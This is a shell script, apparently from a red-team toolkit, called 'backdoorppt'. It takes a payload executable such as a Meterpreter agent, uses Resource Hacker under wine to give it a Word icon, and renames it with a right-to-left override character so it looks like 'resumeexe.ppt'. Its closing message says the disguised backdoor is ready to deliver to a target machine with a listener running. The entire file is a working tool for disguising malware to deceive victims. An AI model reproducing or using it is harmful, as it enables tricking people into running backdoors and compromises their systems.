#!/bin/sh
###
# backdoorppt - a binary transformation tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.1
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
# codename: strange things happen under windows
###




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# variable declarations
# ---------------------
IPATH=`pwd`
H0ME=`echo ~`
VeR="1.1"




# -------------
# Tool banner
# ------------
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+
    |b|a|c|k|d|o|o|r|p|p|t|
    +-+-+-+-+-+-+-+-+-+-+-+
 'A binary transformation tool'
 Credits: Damon Mohammadbagher

!


Colors;
echo ${BlueF}[☆]${YellowF} Please wait, checking backend applications! ${Reset};
sleep 1
# ----------------------
# check for dependencies
# ----------------------
apc=`which ruby`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} Ruby installation '->' ${RedF}not found! ${Reset};
echo ${RedF}[☠]${white} This script requires ruby to work! ${Reset};
sleep 1
exit
else
echo ${BlueF}[☆]${white} Ruby installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

apc=`which wine`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} wine installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires wine to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install wine ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} wine installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

if [ -e "/root/.wine/drive_c/Program Files" ]; then
echo ${BlueF}[☆]${white} Wine Program Files '->' ${GreenF}found! ${Reset};
sleep 1
else
echo ${RedF}[☠]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
winecfg > /dev/null 2>&1
sleep 1
exit
fi




# ------------------------
# start of script funtions
# ------------------------
rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# questions to user
UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed\nexample:meterpreter.exe") > /dev/null 2>&1

  # wine configurtions (winecfg)
  echo ${BlueF}[☆]${white} Select ${GreenF}windows 7${white} from winecfg ${Reset};
  sleep 2
  winecfg > /dev/null 2>&1
  sleep 1

    # check for resource hacker installation (wine)
    if [ -f "$H0ME/.wine/drive_c/Program Files/Resource Hacker/ResourceHacker.exe" ]; then
      echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
      sleep 1
      echo ${BlueF}[☆]${white} Aborting backend appl installation... ${Reset};
      sleep 1
    else
      echo ${RedF}[☠]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
      sleep 1
      echo ${BlueF}[☆]${white} Installing ResourceHacker under .wine directory ${Reset};
      xterm -T "BackdoorPPt" -geometry 90x26 -e "wine $IPATH/reshacker_setup.exe && sleep 3"
    fi

      # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
      echo ${BlueF}[☆]${white} Please wait, Transforming backdoor agent... ${Reset};
      wine $H0ME/.wine/drive_c/"Program Files"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/backdoor.exe -action addskip -res $IPATH/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
      echo ${BlueF}[☆]${white} ResourceHacker, change backdoor agent icon... ${Reset};
      sleep 1

    # insert .ppt hidden extension
    echo ${BlueF}[☆]${white} Adding hidden extension to agent... ${Reset};
    mv $IPATH/backdoor.exe  $IPATH/backdoor_ppt.exe > /dev/null 2>&1
    sleep 1

  cd $IPATH
  # rename backdoor name
  echo ${BlueF}[☆]${white} Word doc builder '->' ${GreenF}done... ${Reset};
  ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
  sleep 1

# final output to user
cat << !

    Final file  : $IPATH/resumeexe.ppt
    Credits     : Damon Mohammadbagher
    Tool Author : r00t-3xp10it (SSA redTeam)

    Your backdoor agent its now transformed into one fake
    word doc (ppt) remmenber that .exe extensions will not
    be 'visible' under windows systems, because the system
    default behavior its: NOT show hidden extensions...

    We are now ready to start a handler (listenner) and
    deliver the transformed agent to the target machine.

!


else
  echo ${RedF}[x]${white} Abort all tasks${RedF}!${Reset};
  sleep 2
fi

exit
